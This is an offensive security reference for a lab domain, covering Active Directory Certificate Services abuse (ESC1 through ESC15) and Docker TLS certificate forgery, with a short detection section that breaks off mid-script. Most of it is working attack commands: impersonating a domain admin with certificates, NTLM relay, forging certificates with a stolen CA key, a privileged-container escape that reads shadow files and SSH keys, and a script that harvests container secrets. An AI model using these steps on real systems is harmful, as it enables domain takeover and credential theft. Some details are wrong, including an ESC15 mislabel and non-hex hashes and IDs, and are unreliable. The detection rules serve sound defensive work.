# Active Directory Certificate Services (AD CS) & Container Certificate Exploitation ..2025..
## Complete Attack Chain Reference for Security Research ..beta..

**Version:** 2.0 (November 2025)  
**Classification:** Educational Security Research  
**Target Audience:** Red Teams, Penetration Testers, Security Researchers

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Environment Setup](#2-environment-setup)
3. [Enumeration & Discovery](#3-enumeration--discovery)
4. [ESC1-ESC15 Exploitation Techniques](#4-esc-exploitation-techniques)
5. [Container Certificate Forgery (Docker TLS)](#5-container-certificate-forgery)
6. [Detection & Monitoring](#6-detection--monitoring)
7. [Remediation & Hardening](#7-remediation--hardening)
8. [Complete Attack Chains](#8-complete-attack-chains)
9. [References](#9-references)

---

## 1. Executive Summary

Active Directory Certificate Services (AD CS) and containerized infrastructure using TLS client authentication present significant attack surfaces when misconfigured. This research demonstrates:

- **15 distinct ESC (Escalation) vectors** for AD CS exploitation
- **Certificate Authority (CA) private key theft** scenarios
- **Docker TLS certificate forgery** for container compromise
- **Multi-stage attack chains** combining credential theft and privilege escalation

### Key Findings

| Attack Vector | Impact | Detection Difficulty |
|--------------|--------|---------------------|
| ESC1-4 (Template Abuse) | Domain Admin | Medium |
| ESC6 (CA Misconfiguration) | Domain Admin | Low |
| ESC8 (NTLM Relay) | Domain Controller Cert | Medium |
| ESC15 (Golden Certificate) | Persistent DA | Very High |
| Docker TLS Forgery | Container Infrastructure | High |

---

## 2. Environment Setup

### 2.1 Lab Topology

```
┌─────────────────────────────────────────────────────────────┐
│                    RESEARCH LAB NETWORK                      │
│                      10.200.100.0/24                         │
└─────────────────────────────────────────────────────────────┘

┌──────────────────┐       ┌──────────────────┐
│   DC-SRV01       │       │   FILE-SRV01     │
│   Domain: corp.  │◄─────►│   File Shares    │
│   research.local │       │   Backup Storage │
│   10.200.100.10  │       │   10.200.100.20  │
│                  │       │                  │
│ • Enterprise CA  │       │ • CA Backups     │
│ • AD DS          │       │ • Config Files   │
│ • Event Logs     │       │ • Scripts        │
└──────────────────┘       └──────────────────┘
         │                          │
         │                          │
         └──────────┬───────────────┘
                    │
         ┌──────────▼──────────┐
         │   CONTAINER-HOST01  │
         │   Docker Host       │
         │   10.200.100.30     │
         │                     │
         │ • Docker daemon     │
         │   (TLS on :2376)    │
         │ • Multiple          │
         │   containers        │
         └─────────────────────┘
                    │
                    │
         ┌──────────▼──────────┐
         │   ATTACKER-WS       │
         │   Kali Linux        │
         │   10.200.100.50     │
         │                     │
         │ • Certipy v4.8.2    │
         │ • Impacket          │
         │ • BloodHound CE     │
         │ • Custom tools      │
         └─────────────────────┘
```

### 2.2 Test Credentials

```yaml
Domain: corp.research.local
Forest Functional Level: 2016

Test Accounts:
  - standard-user@corp.research.local : ComplexPass123!
  - service-acct@corp.research.local : ServiceP@ss456!
  - backup-admin@corp.research.local : BackupSecure789!

Target Accounts:
  - domain-admin@corp.research.local
  - enterprise-admin@corp.research.local
```

### 2.3 Tool Installation

```bash
# Python-based tools
pipx install certipy-ad==4.8.2
pipx install impacket==0.11.0
pipx install bloodhound==5.0.0
pipx install evil-winrm==3.5

# Additional utilities
sudo apt install -y nmap crackmapexec smbclient ldap-utils
sudo apt install -y hashcat john sqlmap

# Windows tools (download from GitHub)
# - Certify.exe (GhostPack/Certify)
# - Rubeus.exe (GhostPack/Rubeus)
# - SharpHound.exe (BloodHoundAD/SharpHound)
```

---

## 3. Enumeration & Discovery

### 3.1 Network Discovery

```bash
# Identify domain controllers and certificate authorities
nmap -p 88,135,139,389,445,636,3268,3269,9389 \
  10.200.100.0/24 \
  -sV -sC \
  -oA network_scan

# Specific AD CS service enumeration
nmap -p 135,445 --script smb-enum-domains,adcs-enum \
  10.200.100.10

# Expected output shows:
# - DC-SRV01 (Domain Controller)
# - Enterprise CA: "corp-DC-SRV01-CA"
```

### 3.2 Certificate Authority Discovery

```bash
# Automated enumeration with Certipy
certipy find \
  -u 'standard-user@corp.research.local' \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable \
  -json \
  -output research_scan

# Output files:
# - research_scan.json (machine-readable)
# - research_scan_Certipy.txt (human-readable)
# - research_scan_BloodHound.zip (import to BloodHound)
```

### 3.3 Template Vulnerability Analysis

```bash
# Identify vulnerable templates
certipy find \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable -stdout | tee template_vulns.txt

# Look for indicators:
# [!] Vulnerable to ESC1: Template allows SAN specification
# [!] Vulnerable to ESC2: Any Purpose EKU configured
# [!] Vulnerable to ESC3: Enrollment agent enabled
# [!] Vulnerable to ESC4: Weak ACLs on template
```

### 3.4 BloodHound Collection

```bash
# Modern collection with AD CS data
bloodhound-python \
  -u standard-user \
  -p 'ComplexPass123!' \
  -d corp.research.local \
  -ns 10.200.100.10 \
  -c All,ADCS \
  --zip

# Import research_*.zip into BloodHound CE

# Key queries:
# - "Find certificate templates where Domain Users can enroll"
# - "Shortest path from standard-user to Domain Admin via certificates"
# - "Find computers with enrollment rights"
```

### 3.5 Multi-CA Environment Detection

```bash
# Search for additional CAs (often missed)
crackmapexec smb 10.200.100.0/24 \
  -u standard-user \
  -p 'ComplexPass123!' \
  -M adcs

# PowerShell enumeration (from Windows host)
Get-ADObject -Filter * \
  -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=research,DC=local" | \
  Select Name, DistinguishedName
```

**Discovery Example:**
```
Found CAs:
1. corp-DC-SRV01-CA (Enterprise Root CA) - Primary, monitored
2. legacy-FILE-SRV01-CA (Standalone CA) - Backup server, often missed
3. test-CONTAINER-CA (Subordinate CA) - Development environment
```

---

## 4. ESC Exploitation Techniques

### 4.1 ESC1 – Subject Alternative Name Abuse

**Vulnerability:** Certificate template allows enrollee to specify arbitrary Subject Alternative Name (SAN).

```bash
# Step 1: Identify ESC1 vulnerable template
certipy find -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable | grep -A 10 "ESC1"

# Example output:
# Template: VulnerableUserAuth
# Permissions: Domain Users can enroll
# Flags: ENROLLEE_SUPPLIES_SUBJECT enabled

# Step 2: Request certificate as Domain Admin
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'VulnerableUserAuth' \
  -upn 'domain-admin@corp.research.local' \
  -dns 'dc-srv01.corp.research.local'

# Output: domain-admin.pfx created

# Step 3: Authenticate with forged certificate
certipy auth \
  -pfx domain-admin.pfx \
  -dc-ip 10.200.100.10

# Expected output:
# [*] Using principal: domain-admin@corp.research.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to domain-admin.ccache
# [*] Trying to retrieve NT hash for 'domain-admin'
# [*] Got NT hash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6

# Step 4: Use NT hash for access
evil-winrm \
  -i dc-srv01.corp.research.local \
  -u domain-admin \
  -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

### 4.2 ESC2 – Any Purpose EKU

**Vulnerability:** Certificate has Any Purpose EKU or no EKU restrictions.

```bash
# Identify ESC2 templates
certipy find -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable -stdout | grep "ESC2"

# Request certificate with SAN abuse (similar to ESC1)
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'AnyPurposeTemplate' \
  -upn 'domain-admin@corp.research.local'

# Authenticate
certipy auth -pfx domain-admin.pfx -dc-ip 10.200.100.10
```

### 4.3 ESC3 – Enrollment Agent Abuse

**Vulnerability:** Template allows requesting certificates on behalf of other users.

```bash
# Step 1: Request enrollment agent certificate
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'EnrollmentAgent'

# Output: enrollment-agent.pfx

# Step 2: Use agent certificate to request admin certificate
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'StandardUser' \
  -on-behalf-of 'corp\domain-admin' \
  -pfx enrollment-agent.pfx

# Step 3: Authenticate with admin certificate
certipy auth -pfx domain-admin.pfx -dc-ip 10.200.100.10
```

### 4.4 ESC4 – Vulnerable Access Control

**Vulnerability:** Standard users can modify certificate template properties.

```bash
# Check for writeable templates
certipy find -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable -stdout | grep "ESC4"

# Modify template to enable SAN (requires write access)
certipy template \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -template 'ModifiableTemplate' \
  -save-old

# Enable ENROLLEE_SUPPLIES_SUBJECT flag
# (Certipy automates this when -save-old is used)

# Request certificate with modified template
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'ModifiableTemplate' \
  -upn 'domain-admin@corp.research.local'

# Restore original template (optional, for stealth)
certipy template \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -template 'ModifiableTemplate' \
  -configuration ModifiableTemplate.json
```

### 4.5 ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnerability:** CA configuration flag allows SAN in any certificate request.

```bash
# Check if vulnerable flag is set
certipy find -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable | grep "ESC6"

# If vulnerable, ANY template can be abused:
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'User' \
  -upn 'domain-admin@corp.research.local'

# Authenticate
certipy auth -pfx domain-admin.pfx -dc-ip 10.200.100.10
```

### 4.6 ESC7 – Vulnerable CA Permissions

**Vulnerability:** ManageCA or ManageCertificates rights on CA.

```bash
# Add yourself as CA officer
certipy ca \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -add-officer standard-user

# Enable vulnerable SubCA template
certipy ca \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -enable-template 'SubCA'

# Request SubCA certificate
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'SubCA' \
  -upn 'domain-admin@corp.research.local'

# Issue the pending request (as officer)
certipy ca \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -issue-request <request_id>

# Retrieve issued certificate
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -retrieve <request_id>
```

### 4.7 ESC8 – NTLM Relay to HTTP Enrollment

**Vulnerability:** Web enrollment endpoints vulnerable to NTLM relay.

```bash
# Start ntlmrelayx targeting web enrollment
ntlmrelayx.py \
  -t http://dc-srv01.corp.research.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template 'DomainController'

# In another terminal, trigger authentication
# Using PetitPotam
python3 PetitPotam.py \
  -u standard-user \
  -p 'ComplexPass123!' \
  -d corp.research.local \
  10.200.100.50 \
  dc-srv01.corp.research.local

# ntlmrelayx will capture authentication and request DC certificate
# Output: base64-encoded certificate saved to file

# Convert and authenticate
certipy auth -pfx dc-srv01.pfx -dc-ip 10.200.100.10
```

### 4.8 ESC9 – No Security Extension

**Vulnerability:** Template doesn't embed security extension, allows UPN manipulation.

```bash
# Step 1: Change UPN of controlled account
# (Requires GenericWrite on user object)
Set-ADUser standard-user \
  -UserPrincipalName 'domain-admin@corp.research.local'

# Step 2: Request certificate (UPN is embedded)
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'ESC9VulnerableTemplate'

# Output: standard-user.pfx (but with admin UPN)

# Step 3: Revert UPN change
Set-ADUser standard-user \
  -UserPrincipalName 'standard-user@corp.research.local'

# Step 4: Authenticate with certificate (appears as domain-admin)
certipy auth -pfx standard-user.pfx -dc-ip 10.200.100.10
```

### 4.9 ESC13 – Issuance Policy with OID Group Link

**Vulnerability:** Certificate issuance policies linked to AD groups via OID.

```bash
# Identify ESC13 vulnerable configurations
certipy find -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -dc-ip 10.200.100.10 \
  -vulnerable -stdout | grep "ESC13"

# Exploitation requires:
# 1. Enrollment in template with specific issuance policy
# 2. OID mapped to privileged group
# 3. Authentication uses OID-based group membership

# Request certificate with issuance policy
certipy req \
  -u standard-user@corp.research.local \
  -p 'ComplexPass123!' \
  -target dc-srv01.corp.research.local \
  -ca 'corp-DC-SRV01-CA' \
  -template 'TemplateWithOIDPolicy'

# Certificate grants group membership via OID extension
```

### 4.10 ESC15 – Golden Certificate (CA Private Key Theft)

**Most Critical:** Complete CA compromise via private key theft.

```bash
# Scenario: Found CA backup on file share
# Location: \\FILE-SRV01\Backups\PKI\

# Step 1: Enumerate file shares
smbclient.py 'corp.research.local/standard-user:ComplexPass123!@FILE-SRV01'

# Step 2: Navigate to backup location
smb: \> cd Backups\PKI\
smb: \> ls
  corp-DC-SRV01-CA.pfx
  ca-backup-credentials.txt
  certificate-templates.xml

# Step 3: Download CA materials
smb: \> get corp-DC-SRV01-CA.pfx
smb: \> get ca-backup-credentials.txt

# Step 4: Extract password
cat ca-backup-credentials.txt
# CA Backup Password: CABackup2024Secure!

# Step 5: Verify CA certificate
certipy cert \
  -pfx corp-DC-SRV01-CA.pfx \
  -password 'CABackup2024Secure!' \
  -export

# Step 6: Forge arbitrary certificate
certipy forge \
  -ca-pfx corp-DC-SRV01-CA.pfx \
  -ca-password 'CABackup2024Secure!' \
  -upn 'domain-admin@corp.research.local' \
  -subject 'CN=domain-admin,CN=Users,DC=corp,DC=research,DC=local' \
  -serial 987654321 \
  -validity 3650 \
  -out forged-admin.pfx

# Step 7: Authenticate with forged certificate
certipy auth -pfx forged-admin.pfx -dc-ip 10.200.100.10

# Result: Complete domain compromise
# Valid until CA certificate expires (5-10 years)
```

---

## 5. Container Certificate Forgery

### 5.1 Docker TLS Architecture

```
┌─────────────────────────────────────────────────────────┐
│  Docker TLS Authentication Flow                          │
└─────────────────────────────────────────────────────────┘

Attacker Machine                         CONTAINER-HOST01
     │                                          │
     │  1. TLS Handshake                        │
     │─────────────────────────────────────────→│
     │                                          │
     │  2. Present Client Certificate           │
     │     (forged-client-cert.pem)             │
     │─────────────────────────────────────────→│
     │                                          │
     │                                          │
     │  3. Verify Against CA (ca.pem)          │
     │←─────────────────────────────────────────│
     │                                          │
     │  4. Authentication Success              │
     │←─────────────────────────────────────────│
     │                                          │
     │  5. Docker API Access Granted           │
     │◄────────────────────────────────────────►│
     │                                          │
```

### 5.2 CA Material Discovery

```bash
# Common locations for Docker CA materials
# Network shares
\\FILE-SRV01\IT-Infrastructure\Container-PKI\
\\FILE-SRV01\DevOps\docker-tls-setup\

# Git repositories
http://gitlab.corp.research.local/infrastructure/ansible-docker
http://github.internal.corp/ops/docker-deployment

# Container volumes
/var/lib/docker/volumes/tls-certs/_data/
/opt/docker-tls/

# Configuration management
/etc/ansible/group_vars/docker_hosts.yml
/etc/puppet/modules/docker/files/tls/

# Search for CA files
find / -name "ca-key.pem" -o -name "ca.pem" 2>/dev/null

# SMB enumeration
crackmapexec smb 10.200.100.0/24 \
  -u standard-user \
  -p 'ComplexPass123!' \
  --shares

# Spider shares for certificates
smbclient.py \
  'corp.research.local/standard-user:ComplexPass123!@FILE-SRV01' \
  -pattern '.*\.(pem|key|pfx|p12)$'
```

**Discovery Example:**
```
Found: \\FILE-SRV01\DevOps\docker-tls-setup\
  ├── ca.pem                    ← CA certificate
  ├── ca-key.pem                ← CA private key (CRITICAL)
  ├── server-cert.pem           ← Docker daemon cert
  ├── server-key.pem            ← Docker daemon key
  └── setup-instructions.txt    ← May contain passwords
```

### 5.3 Client Certificate Forgery

```bash
# ===== PHASE 1: Download CA Materials =====
smbclient //FILE-SRV01/DevOps \
  -U 'corp.research.local/standard-user%ComplexPass123!'

smb: \> cd docker-tls-setup
smb: \> get ca.pem
smb: \> get ca-key.pem
smb: \> exit

# ===== PHASE 2: Generate Client Certificate =====
# Step 1: Create private key
openssl genrsa -out docker-admin-key.pem 2048

# Step 2: Generate Certificate Signing Request
openssl req \
  -new \
  -key docker-admin-key.pem \
  -out docker-admin.csr \
  -subj "/CN=docker-admin/O=Administrators/C=US"

# Step 3: Sign with stolen CA
openssl x509 \
  -req \
  -in docker-admin.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out docker-admin-cert.pem \
  -days 3650 \
  -sha256

# Step 4: Verify certificate
openssl x509 -in docker-admin-cert.pem -noout -text | head -20

# Cleanup CSR
rm docker-admin.csr

echo "[+] Forged certificate created: docker-admin-cert.pem"
```

### 5.4 Docker Remote Access

```bash
# ===== METHOD 1: Direct Command =====
docker \
  --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=docker-admin-cert.pem \
  --tlskey=docker-admin-key.pem \
  -H tcp://10.200.100.30:2376 \
  ps -a

# ===== METHOD 2: Environment Variables (Cleaner) =====
export DOCKER_TLS_VERIFY=1
export DOCKER_HOST=tcp://10.200.100.30:2376
export DOCKER_CERT_PATH=$(pwd)

# Now use Docker normally
docker ps -a
docker images
docker info

# ===== METHOD 3: Multi-Host Access =====
# Create configuration directory
mkdir -p ~/.docker/container-host01
cp ca.pem docker-admin-cert.pem docker-admin-key.pem \
   ~/.docker/container-host01/

# Use with context
docker --tlsverify \
  --tlscacert ~/.docker/container-host01/ca.pem \
  --tlscert ~/.docker/container-host01/docker-admin-cert.pem \
  --tlskey ~/.docker/container-host01/docker-admin-key.pem \
  -H tcp://10.200.100.30:2376 \
  version
```

### 5.5 Container Configuration Extraction

```bash
# ===== ENUMERATE RUNNING CONTAINERS =====
export DOCKER_TLS_VERIFY=1
export DOCKER_HOST=tcp://10.200.100.30:2376
export DOCKER_CERT_PATH=$(pwd)

docker ps -a --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"

# Example output:
# CONTAINER ID   NAMES              IMAGE                    STATUS
# a1b2c3d4e5f6   app-database       postgres:14              Up 5 days
# b2c3d4e5f6a7   web-frontend       nginx:alpine             Up 5 days
# c3d4e5f6a7b8   password-manager   pwm:latest               Up 5 days

# ===== TARGET: Password Manager Container =====
CONTAINER_ID="c3d4e5f6a7b8"
CONTAINER_NAME="password-manager"

# Extract configuration directory
docker cp ${CONTAINER_ID}:/config ./extracted_configs/${CONTAINER_NAME}/

# Extract additional directories
docker cp ${CONTAINER_ID}:/etc ./extracted_configs/${CONTAINER_NAME}/etc/
docker cp ${CONTAINER_ID}:/var/log ./extracted_configs/${CONTAINER_NAME}/logs/

# Inspect container metadata
docker inspect ${CONTAINER_ID} > ./extracted_configs/${CONTAINER_NAME}_inspect.json

# Extract environment variables (often contain credentials)
docker inspect ${CONTAINER_ID} | \
  jq -r '.[0].Config.Env[]' > \
  ./extracted_configs/${CONTAINER_NAME}_env.txt
```

### 5.6 Credential Extraction & Analysis

```bash
# ===== SEARCH FOR SENSITIVE DATA =====
# Search configuration files
grep -r "password\|secret\|token\|apikey\|credential" \
  ./extracted_configs/ \
  --include="*.xml" \
  --include="*.properties" \
  --include="*.json" \
  --include="*.yml" \
  --include="*.conf" \
  --color=always | tee credentials_found.txt

# ===== EXAMPLE: PWM Configuration Analysis =====
# Found in: ./extracted_configs/password-manager/backup/PwmConfiguration.xml-backup

cat ./extracted_configs/password-manager/backup/PwmConfiguration.xml-backup | \
  grep -A 2 "password\|hash"

# Output:
# <property key="configPasswordHash">
#   $2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG
# </property>
# 
# <property key="ldapPassword">
#   {encrypted}AES256:base64encodedvalue
# </property>
# 
# <property key="dbPassword">
#   DatabaseP@ssw0rd2024!
# </property>

# ===== EXTRACT ALL HASHES =====
# BCrypt hashes
grep -rE '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' \
  ./extracted_configs/ > bcrypt_hashes.txt

# NTLM hashes
grep -rE '[a-fA-F0-9]{32}' ./extracted_configs/ > ntlm_hashes.txt

# SHA hashes
grep -rE '\$[156]\$[a-zA-Z0-9$./]+' ./extracted_configs/ > sha_hashes.txt
```

### 5.7 Password Cracking

```bash
# ===== BCRYPT HASH CRACKING =====
# Hash from PWM configuration
echo '$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG' > pwm.hash

# Crack with Hashcat (mode 3200 = bcrypt)
hashcat -m 3200 -a 0 pwm.hash \
  /usr/share/wordlists/rockyou.txt \
  --force \
  --status

# Alternative: John the Ripper
john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  pwm.hash

# Show cracked password
hashcat -m 3200 pwm.hash --show

# Expected result (BCrypt cost 04 is weak):
# $2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG:admin123

# ===== DATABASE CREDENTIALS =====
# Found plaintext in configuration
# Username: pwm_db_admin
# Password: DatabaseP@ssw0rd2024!
# Connection: postgres://10.200.100.30:5432/pwm_database
```

### 5.8 Advanced Container Exploitation

```bash
# ===== CONTAINER ESCAPE: PRIVILEGED CONTAINER =====
# Create privileged container with host access
docker run -it \
  --privileged \
  --pid=host \
  --net=host \
  --volume /:/host \
  debian:latest \
  nsenter -t 1 -m -u -n -i sh

# You now have root on CONTAINER-HOST01

# ===== ENUMERATE HOST SYSTEM =====
# From privileged container
chroot /host

cat /etc/shadow
cat /root/.ssh/id_rsa
find /home -name "*.kdbx" -o -name "*.txt"

# ===== EXTRACT DOCKER SECRETS =====
# Docker secrets are mounted in containers
docker exec password-manager cat /run/secrets/db_password

# ===== EXTRACT ALL SECRETS FROM ALL CONTAINERS =====
docker ps -q | while read container; do
  echo "=== Container: $container ==="
  docker exec $container ls -la /run/secrets/ 2>/dev/null
  docker exec $container cat /run/secrets/* 2>/dev/null
done
```

### 5.9 Automation Script

```bash
#!/bin/bash
# docker-exfil.sh - Automated container credential extraction

TARGET_HOST="10.200.100.30"
CA_CERT="ca.pem"
CLIENT_CERT="docker-admin-cert.pem"
CLIENT_KEY="docker-admin-key.pem"
OUTPUT_DIR="./container_exfil_$(date +%Y%m%d_%H%M%S)"

echo "[*] Docker Container Credential Extraction Tool"
echo "[*] Target: ${TARGET_HOST}:2376"
echo ""

# Setup environment
export DOCKER_TLS_VERIFY=1
export DOCKER_HOST=tcp://${TARGET_HOST}:2376
export DOCKER_CERT_PATH=$(pwd)

# Create output directory
mkdir -p "${OUTPUT_DIR}"

# Get list of containers
echo "[*] Enumerating containers..."
docker ps -aq > "${OUTPUT_DIR}/container_ids.txt"

# Process each container
while read container_id; do
    echo "[*] Processing container: ${container_id}"
    
    # Get container name
    container_name=$(docker inspect ${container_id} | jq -r '.[0].Name' | sed 's/\///')
    
    mkdir -p "${OUTPUT_DIR}/${container_name}"
    
    # Extract configurations
    docker cp ${container_id}:/config "${OUTPUT_DIR}/${container_name}/" 2>/dev/null
    docker cp ${container_id}:/etc "${OUTPUT_DIR}/${container_name}/" 2>/dev/null
    
    # Extract metadata
    docker inspect ${container_id} > "${OUTPUT_DIR}/${container_name}/inspect.json"
    
    # Extract environment variables
    docker inspect ${container_id} | \
        jq -r '.[0].Config.Env[]' > \
        "${OUTPUT_DIR}/${container_name}/environment.txt"
    
    # Extract secrets
    docker exec ${container_id} ls -la /run/secrets/ > \
        "${OUTPUT_DIR}/${container_name}/secrets_list.txt" 2>/dev/null
    
    echo "[+] Container ${container_name} processed"
done < "${OUTPUT_DIR}/container_ids.txt"

# Search for credentials
echo "[*] Searching for credentials..."
grep -r "password\|secret\|token\|apikey" "${OUTPUT_DIR}" \
    --include="*.xml" --include="*.json" --include="*.properties" \
    --include="*.yml" --include="*.txt" --include="*.conf" \
    > "${OUTPUT_DIR}/credentials_found.txt"

# Extract hashes
echo "[*] Extracting password hashes..."
grep -rE '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' "${OUTPUT_DIR}" \
    > "${OUTPUT_DIR}/bcrypt_hashes.txt"

echo ""
echo "[+] Extraction complete: ${OUTPUT_DIR}"
echo "[+] Credentials found: $(wc -l < ${OUTPUT_DIR}/credentials_found.txt) matches"
echo "[+] BCrypt hashes: $(wc -l < ${OUTPUT_DIR}/bcrypt_hashes.txt)"
```

---

## 6. Detection & Monitoring

### 6.1 Windows Event Log Monitoring

```powershell
# ===== KEY EVENT IDS FOR AD CS ABUSE =====
# Event 4886: Certificate Services received certificate request
# Event 4887: Certificate Services approved and issued certificate
# Event 4888: Certificate Services denied certificate request
# Event 4890: Certificate Services template security changed
# Event 4899: Certificate Services template created/modified

# Query suspicious certificate requests
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4886, 4887
} -MaxEvents 1000 | Where-Object {
    # Look for admin UPN requests from non-admin accounts
    $_.Properties[1].Value -match 'domain-admin|enterprise-admin' -and
    $_.Properties[0].Value -notmatch 'DC-SRV01|authorized-admin'
} | Select-Object TimeCreated, @{
    Name='Requester'; Expression={$_.Properties[0].Value}
}, @{
    Name='Subject'; Expression={$_.Properties[1].Value}
}, @{
    Name='Template'; Expression={$_.Properties[2].Value}
}

# Monitor for ESC6 exploitation (EDITF flag abuse)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4887
} | Where-Object {
    $_.Properties | Where-Object {
        $_ -match 'SAN:|san:|Subject Alternative Name'
    }
}

# Detect certificate authentication (smartcard logon)
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4624
} | Where-Object {
    $_.Properties[8].Value -eq 10  # Logon Type 10 = RemoteInteractive
    $_.Properties[10].Value -match 'Kerberos'
} | Select-Object TimeCreated, @{
    Name='User'; Expression={$_.Properties[5].Value}
}, @{
    Name='Source'; Expression={$_.Properties[11].Value}
}
```

### 6.2 Splunk Detection Queries

```spl
# ESC1/ESC2: Suspicious SAN in certificate request
index=windows EventCode=4886 OR EventCode=4887
| rex field=Attributes "SAN:(?<san_upn>[^\s]+)"
| where isnotnull(san_upn)
| eval suspicious=if(match(san_upn, "domain-admin|enterprise-admin|administrator"), 1, 0)
| where suspicious=1
| stats count by Requester, san_upn, Template, _time
| sort -_time

# Certificate authentication from unusual source
index=windows EventCode=4624 LogonType=10 AuthenticationPackage="Kerberos"
| where NOT match(SourceNetworkAddress, "10\.200\.100\.(10|20|30)")
| stats count by TargetUserName, SourceNetworkAddress, WorkstationName
| where count > 3

# ESC4: Template modification
index=windows EventCode=4890 OR EventCode=4899
| stats count by User, TemplateName, Action, _time
| sort -_time

# ESC8: Web enrollment abuse
index=iis cs_uri_stem="/certsrv/certfnsh.asp"
| stats count by c_ip, cs_username, sc_status
| where count > 10
```

### 6.3 Sigma Rules (SIEM Integration)

```yaml
# Suspicious Certificate Request with SAN
title: AD CS Certificate Request with Subject Alternative Name
id: ab12cd34-ef56-gh78-ij90-kl12mn34op56
status: experimental
description: Detects certificate requests specifying SAN (potential ESC1/ESC2)
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4886
  filter:
    Attributes|contains:
      - 'SAN:'
      - 'san:'
      - 'upn='
  condition: selection and filter
falsepositives:
  - Legitimate certificate renewals
  - Authorized enrollment agents
level: high

---

# Certificate Authentication from Non-Standard Location
title: Certificate-Based Authentication from Unusual Source
id: cd34ef56-gh78-ij90-kl12-mn34op56qr78
status: experimental
description: Detects smartcard/certificate authentication from unexpected IPs
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 10
    AuthenticationPackage: 'Kerberos'
  filter:
    IpAddress|startswith:
      - '10.200.100.10'  # Authorized DC
      - '10.200.100.20'  # Authorized admin workstation
  condition: selection and not filter
level: medium
```

### 6.4 Docker TLS Abuse Detection

```bash
# Monitor Docker API connections
# On CONTAINER-HOST01

# Check active connections to Docker daemon
ss -tnp | grep :2376

# Example output showing suspicious connection:
# ESTAB  0  0  10.200.100.30:2376  10.200.100.50:45678  users:(("dockerd",pid=1234))

# Enable Docker audit logging
cat > /etc/audit/rules.d/docker.rules << 'EOF'
# Monitor Docker TLS certificate access
-w /etc/docker/ca.pem -p rwxa -k docker_ca
-w /etc/docker/ca-key.pem -p rwxa -k docker_ca_key
-w /etc/docker/server-cert.pem -p rwxa -k docker_server_cert

# Monitor Docker daemon configuration
-w /etc/docker/daemon.json -p wa -k docker_config

# Monitor Docker socket
-w /var/run/docker.sock -p rwxa -k docker_socket
EOF

# Restart auditd
systemctl restart auditd

# View audit logs
ausearch -k docker_ca_key -ts recent

# Monitor for new certificate serial numbers
# Store baseline
openssl x509 -in /etc/docker/ca.pem -noout -serial > /var/log/ca_serial_baseline.txt

# Check for changes
CURRENT_SERIAL=$(openssl x509 -in /etc/docker/ca.pem -noout -serial)
